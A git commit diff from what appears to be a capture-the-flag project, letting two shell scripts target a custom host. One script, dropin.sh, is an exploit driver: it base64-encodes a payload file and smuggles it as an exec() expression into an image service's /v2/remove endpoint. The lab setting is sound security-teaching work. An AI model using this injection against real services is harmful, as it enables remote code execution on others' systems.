112966e6bcb6de6352c76187166249cd21f75e2b
Ramon Marquez <ramon.marquez@graylog.com>
2024-07-22 16:30:08 -0400

    feat(ctf): support custom hostname

--- ctf/scripts/dropin.sh
+++ ctf/scripts/dropin.sh
@@ -1,5 +1,7 @@
 #!/bin/sh
 
+HOST=${1:-"localhost"}
+
 mkdir images
 
 export PAYLOAD_FILE=$(pwd)/payload.py
@@ -13,7 +15,7 @@ base64 $IMAGE_FILE | tr -d \\n | jq -Rn '.image = inputs' > input.json
 jq --arg expression "exec('import base64;exec(base64.b64decode(\\\"$(base64 $PAYLOAD_FILE | tr -d \\n)\\\"))')" '.expr = $expression' input.json > v2.json && mv v2.json input.json
 
 echo "\nTesting /v2/remove endpoint..."
-curl -H "Content-type:application/json" -d @input.json http://localhost:8080/v2/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > images/output-exploit.png
+curl -H "Content-type:application/json" -d @input.json http://$HOST:8080/v2/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > images/output-exploit.png
 
 rm input.json
 echo "All done!"
--- ctf/scripts/tests.sh
+++ ctf/scripts/tests.sh
@@ -1,20 +1,22 @@
 #!/bin/sh
 
+HOST=${1:-"localhost"}
+
 mkdir images
 
 echo "Fetching sample image..."
 curl -L -o images/input.jpg "https://github.com/danielgatis/rembg/blob/main/examples/animal-1.jpg?raw=true"
-IMAGE_FILE=${1:-"images/input.jpg"}
+IMAGE_FILE=${2:-"images/input.jpg"}
 
 base64 $IMAGE_FILE | tr -d \\n | jq -Rn '.image = inputs' > input.json
 
 echo "\nTesting /v1/remove endpoint..."
-curl -H "Content-type:application/json" -d @input.json http://localhost:8080/v1/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > images/output-v1.png
+curl -H "Content-type:application/json" -d @input.json http://$HOST:8080/v1/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > images/output-v1.png
 
 jq '.expr = "convert(image,'"'L'"')"' input.json > v2.json && mv v2.json input.json
 
 echo "\nTesting /v2/remove endpoint..."
-curl -H "Content-type:application/json" -d @input.json http://localhost:8080/v2/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > images/output-v2.png
+curl -H "Content-type:application/json" -d @input.json http://$HOST:8080/v2/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > images/output-v2.png
 
 echo "\nAll done! Please, go to port 8081 to check out your images (press cmd/ctrl + c when you are ready to exit this script)"
 rm input.json && cd images && python3 -m http.server 8081
